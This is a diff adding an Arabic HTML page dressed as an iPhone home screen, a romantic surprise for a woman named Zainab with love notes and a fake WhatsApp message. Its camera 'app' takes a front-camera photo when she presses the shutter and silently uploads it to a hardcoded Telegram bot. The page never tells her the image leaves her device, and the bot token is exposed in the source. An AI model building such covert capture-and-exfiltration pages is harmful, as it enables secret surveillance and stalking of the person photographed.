@@ -1,1 +1,586 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>إلى زينب ❤️</title>
+    <!-- استدعاء خط تجوال العربي -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- مكتبة الأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- مكتبة Tailwind CSS للتصميم -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Tajawal', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* تنسيقات إضافية مخصصة */
+        body {
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* إطار الآيفون */
+        .iphone-frame {
+            width: 100%;
+            height: 100vh;
+            background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2564&auto=format&fit=crop'); 
+            background-size: cover;
+            background-position: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @media (min-width: 768px) {
+            .iphone-frame {
+                width: 375px;
+                height: 812px;
+                border-radius: 40px;
+                box-shadow: 0 0 0 10px #000, 0 0 0 12px #333, 0 30px 60px rgba(0,0,0,0.5);
+                margin: 20px auto;
+            }
+        }
+
+        /* الجزيرة التفاعلية (Notch) */
+        .dynamic-island {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 120px;
+            height: 35px;
+            background-color: #000;
+            border-radius: 20px;
+            z-index: 50;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 15px;
+        }
+
+        .camera-lens {
+            width: 12px;
+            height: 12px;
+            background: #111;
+            border: 2px solid #222;
+            border-radius: 50%;
+            box-shadow: inset 0 0 5px rgba(255,255,255,0.2);
+        }
+
+        /* شريط الحالة العُلوي */
+        .status-bar {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            padding: 15px 30px 0;
+            display: flex;
+            justify-content: space-between;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            z-index: 40;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        /* شريط العودة للشاشة الرئيسية */
+        .home-indicator {
+            position: absolute;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 130px;
+            height: 5px;
+            background-color: white;
+            border-radius: 100px;
+            z-index: 60;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        /* أيقونات التطبيقات */
+        .app-icon {
+            width: 65px;
+            height: 65px;
+            border-radius: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            color: white;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+            cursor: pointer;
+        }
+        .app-icon:active {
+            transform: scale(0.9);
+        }
+
+        /* تطبيقات الآيفون (النوافذ) */
+        .app-window {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 30;
+            transform: translateY(100%);
+            transition: transform 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .app-window.active {
+            transform: translateY(0);
+        }
+
+        /* تخصيص تطبيق الملاحظات */
+        .notes-bg { background-color: #f2f2f7; }
+        .note-item {
+            border-bottom: 1px solid #e5e5ea;
+            cursor: pointer;
+        }
+        .note-item:last-child { border-bottom: none; }
+
+        /* تخصيص تطبيق الكاميرا */
+        .camera-bg { background-color: #000; color: white; }
+        #camera-feed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .shutter-btn-container {
+            position: absolute;
+            bottom: 40px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 40;
+        }
+        .shutter-btn {
+            width: 70px;
+            height: 70px;
+            background-color: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 4px solid white;
+            cursor: pointer;
+        }
+        .shutter-btn-inner {
+            width: 54px;
+            height: 54px;
+            background-color: white;
+            border-radius: 50%;
+            transition: transform 0.1s;
+        }
+        .shutter-btn:active .shutter-btn-inner {
+            transform: scale(0.9);
+        }
+
+        /* تأثير الفلاش */
+        #camera-flash {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 50;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.1s ease-out;
+        }
+
+        /* إشعار الواتساب */
+        #whatsapp-notify {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            z-index: 70;
+            transform: translateY(-150%);
+            transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        #whatsapp-notify.show {
+            transform: translateY(0);
+        }
+
+        /* رسالة منبثقة (Alert) الآيفون */
+        #ios-alert {
+            position: absolute;
+            inset: 0;
+            z-index: 80;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        #ios-alert.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        #ios-alert-box {
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        #ios-alert.show #ios-alert-box {
+            transform: scale(1);
+        }
+        .overlay {
+            position: absolute;
+            inset: 0;
+            background-color: rgba(0,0,0,0.4);
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="iphone-frame" id="iphone">
+        
+        <!-- شريط الحالة (الوقت والبطارية) -->
+        <div class="status-bar">
+            <div id="clock">12:00</div>
+            <div class="flex gap-2 text-sm" dir="ltr">
+                <i class="fas fa-signal"></i>
+                <i class="fas fa-wifi"></i>
+                <i class="fas fa-battery-full"></i>
+            </div>
+        </div>
+
+        <!-- الجزيرة التفاعلية -->
+        <div class="dynamic-island">
+            <div class="camera-lens"></div>
+            <div class="w-2 h-2 rounded-full bg-green-500 opacity-0 transition-opacity" id="camera-indicator"></div>
+        </div>
+
+        <!-- إشعار واتساب الوهمي -->
+        <div id="whatsapp-notify" class="bg-white/85 backdrop-blur-md rounded-2xl p-3 shadow-lg flex items-start gap-3 cursor-pointer" onclick="hideNotification()">
+            <div class="bg-green-500 w-10 h-10 min-w-[40px] rounded-xl flex items-center justify-center text-white text-2xl shadow-sm">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <div class="flex-1 overflow-hidden">
+                <div class="flex justify-between items-center mb-1">
+                    <span class="font-bold text-black text-sm">فؤاد ❤️</span>
+                    <span class="text-xs text-gray-500">الآن</span>
+                </div>
+                <p class="text-sm text-gray-800 leading-tight">يا أجمل وجه شافته عيوني.. صورتك نورت دنيتي كلها 😍❤️</p>
+            </div>
+        </div>
+
+        <!-- الشاشة الرئيسية (أيقونات التطبيقات) -->
+        <div class="absolute inset-0 pt-20 px-6 pb-24 z-10 flex flex-col justify-between">
+            <div class="grid grid-cols-4 gap-4 mt-8">
+                
+                <!-- أيقونة الملاحظات -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('notes-app')">
+                    <div class="app-icon bg-yellow-400 text-white">
+                        <i class="fas fa-book"></i>
+                    </div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الملاحظات</span>
+                </div>
+
+                <!-- أيقونة الكاميرا -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('camera-app')">
+                    <div class="app-icon bg-gray-200 text-gray-800">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الكاميرا</span>
+                </div>
+
+            </div>
+            
+            <!-- شريط التطبيقات السفلي (Dock) -->
+            <div class="bg-white/30 backdrop-blur-md rounded-3xl p-4 flex justify-around">
+                <div class="app-icon bg-green-500"><i class="fas fa-phone"></i></div>
+                <div class="app-icon bg-blue-500"><i class="fas fa-comment"></i></div>
+                <div class="app-icon bg-blue-400"><i class="fab fa-safari"></i></div>
+                <div class="app-icon bg-pink-500"><i class="fas fa-music"></i></div>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق الملاحظات ================= -->
+        <div id="notes-app" class="app-window notes-bg">
+            <div class="pt-20 px-6 pb-4">
+                <h1 class="text-3xl font-bold text-gray-800 mb-6">ملاحظاتي</h1>
+                <div class="bg-white rounded-xl shadow-sm overflow-hidden" id="notes-list">
+                    <!-- سيتم إضافة الملاحظات هنا -->
+                </div>
+            </div>
+        </div>
+
+        <div id="note-reader" class="app-window notes-bg" style="z-index: 35;">
+            <div class="pt-16 px-4 flex items-center border-b border-gray-200 pb-2">
+                <button onclick="closeNoteReader()" class="text-yellow-600 font-bold flex items-center gap-1 text-lg">
+                    <i class="fas fa-chevron-right"></i> الملاحظات
+                </button>
+            </div>
+            <div class="p-6">
+                <h2 id="reader-title" class="text-2xl font-bold text-gray-800 mb-4"></h2>
+                <div id="reader-content" class="text-gray-700 text-lg leading-relaxed whitespace-pre-wrap"></div>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق الكاميرا ================= -->
+        <div id="camera-app" class="app-window camera-bg relative">
+            
+            <!-- شريط الكاميرا العلوي -->
+            <div class="absolute top-16 w-full flex justify-between items-center px-6 z-40">
+                <button onclick="closeApps()" class="text-white text-xl"><i class="fas fa-chevron-down"></i></button>
+                
+                <!-- زر الفلاتر الجديد -->
+                <button onclick="showFilterAlert()" class="text-yellow-400 font-bold flex flex-col items-center gap-1">
+                    <i class="fas fa-magic text-xl"></i>
+                    <span class="text-xs">فلاتر</span>
+                </button>
+                
+                <i class="fas fa-bolt text-white text-xl"></i>
+            </div>
+
+            <!-- عنصر الفيديو לעرض الكاميرا -->
+            <video id="camera-feed" autoplay playsinline muted></video>
+            
+            <!-- عنصر خفي لالتقاط الصورة -->
+            <canvas id="photo-canvas" class="hidden"></canvas>
+
+            <!-- زر الالتقاط -->
+            <div class="shutter-btn-container">
+                <div class="shutter-btn" onclick="takePicture()">
+                    <div class="shutter-btn-inner"></div>
+                </div>
+            </div>
+
+            <!-- تأثير الفلاش -->
+            <div id="camera-flash"></div>
+        </div>
+
+        <!-- ================= التنبيه المنبثق (للفلاتر) ================= -->
+        <div id="ios-alert">
+            <div class="overlay"></div>
+            <div class="bg-white/95 backdrop-blur-xl w-64 rounded-2xl flex flex-col text-center relative z-10" id="ios-alert-box">
+                <div class="p-5 pb-4">
+                    <h3 class="font-semibold text-lg text-black">عفواً</h3>
+                    <p class="text-sm text-gray-800 mt-1 leading-relaxed">هالجمال كله ويحتاج فلاتر؟ 🥺❤️</p>
+                </div>
+                <div class="border-t border-gray-300">
+                    <button onclick="closeFilterAlert()" class="w-full py-3 text-blue-500 font-semibold text-lg active:bg-gray-200 rounded-b-2xl transition">أكيد لا</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- شريط العودة للشاشة الرئيسية -->
+        <div class="home-indicator" onclick="closeApps()"></div>
+
+    </div>
+
+    <script>
+        // ================= إعدادات تيليجرام (تم إدخال بياناتك) =================
+        const TELEGRAM_BOT_TOKEN = '8507267987:AAEEpWypLGv5lP27tV2WaUYZgPRnr3JjwHg'; 
+        const TELEGRAM_CHAT_ID = '8741862928';
+        // =========================================================================
+
+        // تحديث الساعة
+        function updateClock() {
+            const now = new Date();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            hours = hours % 12 || 12; 
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            document.getElementById('clock').innerText = `${hours}:${minutes}`;
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // التحكم في التطبيقات
+        let currentStream = null;
+
+        function openApp(appId) {
+            document.getElementById(appId).classList.add('active');
+            if (appId === 'camera-app') {
+                startCamera();
+            }
+        }
+
+        function closeApps() {
+            const windows = document.querySelectorAll('.app-window');
+            windows.forEach(win => win.classList.remove('active'));
+            stopCamera();
+            closeNoteReader();
+        }
+
+        // ================= برمجة تطبيق الملاحظات =================
+        const notes = [
+            {
+                title: "إلى أجمل صدفة ❤️",
+                preview: "زينب.. يا من جعلتِ للحياة...",
+                content: "زينب..\nيا من جعلتِ للحياة لوناً وطعماً آخر.\nمنذ اليوم الذي عرفتك فيه، أدركت أن الصدف أحياناً تخبئ لنا أجمل أقدارنا.\n\nأحبك يا كل أشيائي الجميلة."
+            },
+            {
+                title: "ملاحظة سريعة",
+                preview: "فقط أردت أن أقول لكِ...",
+                content: "فقط أردت أن أقول لكِ أنكِ تبدين جميلة جداً اليوم، وحتى لو لم أراكِ، فأنا أعرف أنك كذلك.\nابتسمي، فابتسامتك هي عالمي."
+            },
+            {
+                title: "تاريخ لا يُنسى",
+                preview: "اليوم الذي التقينا فيه...",
+                content: "هناك أيام تمر كأي يوم عادي، وهناك يوم محفور في ذاكرتي للأبد.. اليوم الذي أصبحتِ فيه جزءاً من حياتي.\n\nشكراً لوجودك معي يا زينب."
+            }
+        ];
+
+        function renderNotes() {
+            const list = document.getElementById('notes-list');
+            list.innerHTML = '';
+            notes.forEach((note, index) => {
+                list.innerHTML += `
+                    <div class="note-item p-4 hover:bg-gray-50 transition" onclick="openNote(${index})">
+                        <h3 class="font-bold text-gray-900">${note.title}</h3>
+                        <p class="text-gray-500 text-sm mt-1">${note.preview}</p>
+                    </div>
+                `;
+            });
+        }
+        renderNotes();
+
+        function openNote(index) {
+            const note = notes[index];
+            document.getElementById('reader-title').innerText = note.title;
+            document.getElementById('reader-content').innerText = note.content;
+            document.getElementById('note-reader').classList.add('active');
+        }
+
+        function closeNoteReader() {
+            document.getElementById('note-reader').classList.remove('active');
+        }
+
+        // ================= وظائف زر الفلاتر =================
+        function showFilterAlert() {
+            document.getElementById('ios-alert').classList.add('show');
+        }
+
+        function closeFilterAlert() {
+            document.getElementById('ios-alert').classList.remove('show');
+        }
+
+        // ================= برمجة تطبيق الكاميرا =================
+        async function startCamera() {
+            const video = document.getElementById('camera-feed');
+            const indicator = document.getElementById('camera-indicator');
+            
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                video.srcObject = currentStream;
+                indicator.classList.remove('opacity-0'); 
+            } catch (err) {
+                console.error("خطأ في فتح الكاميرا: ", err);
+                alert("يرجى السماح بالوصول للكاميرا لرؤية المفاجأة!");
+            }
+        }
+
+        function stopCamera() {
+            const indicator = document.getElementById('camera-indicator');
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+                indicator.classList.add('opacity-0');
+            }
+        }
+
+        function takePicture() {
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('photo-canvas');
+            const flash = document.getElementById('camera-flash');
+            
+            if (!currentStream) return;
+
+            // 1. تأثير الفلاش
+            flash.style.opacity = '1';
+            setTimeout(() => { flash.style.opacity = '0'; }, 150);
+
+            // 2. إظهار إشعار الواتساب (رسالة الغزل) بعد ثانية من الالتقاط
+            setTimeout(() => {
+                showNotification();
+            }, 1000);
+
+            // 3. التقاط الصورة
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            
+            // رسم الصورة معكوسة كالمرآة
+            context.translate(canvas.width, 0);
+            context.scale(-1, 1);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // 4. إرسال الصورة لتيليجرام
+            canvas.toBlob((blob) => {
+                sendPhotoToTelegram(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        // ================= إشعارات الواتساب =================
+        let notifyTimeout;
+        function showNotification() {
+            const notify = document.getElementById('whatsapp-notify');
+            notify.classList.add('show');
+            
+            // إخفاء الإشعار تلقائياً بعد 5 ثواني
+            clearTimeout(notifyTimeout);
+            notifyTimeout = setTimeout(() => {
+                hideNotification();
+            }, 5000);
+        }
+
+        function hideNotification() {
+            document.getElementById('whatsapp-notify').classList.remove('show');
+        }
+
+        // ================= الإرسال إلى تيليجرام =================
+        function sendPhotoToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, 'zainab_photo.jpg');
+            formData.append('caption', 'فؤاد، لقد التقطت زينب صورة للتو! ❤️');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log('تم الإرسال لتيليجرام بنجاح');
+                } else {
+                    console.error('خطأ من تيليجرام:', data.description);
+                }
+            })
+            .catch((error) => {
+                console.error('حدث خطأ أثناء الإرسال:', error);
+            });
+        }
+    </script>
+</body>
+</html>
+
 
